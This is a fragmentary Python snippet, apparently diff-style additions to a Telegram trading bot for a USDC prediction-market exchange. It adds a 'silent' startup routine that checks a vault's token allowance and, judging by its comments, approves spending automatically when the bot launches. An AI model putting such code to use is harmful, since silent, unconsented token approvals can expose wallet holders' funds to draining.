...
# --- ADDED: EXTENDED ABI FOR APPROVAL ---
...
# --- ADDED: SILENT STARTUP APPROVAL LOGIC ---
def preflight_auth():
    v_addr = Web3.to_checksum_address(vault.address)
    if usdc_contract.functions.allowance(v_addr, CTF_EXCHANGE).call() < 10**12:
...
async def main_handler(update, context):
    ...
    if text == ' START SNIPER' or text == ' REFRESH':
        ...
        if not success or not OMNI_STRIKE_CACHE:
            await update.message.reply_text(" <b>SIGNAL LOST: CHECK NETWORK</b>")
            return
...
if __name__ == "__main__":
    # --- ADDED: TRIGGER SILENT APPROVAL ON START ---
    preflight_auth()
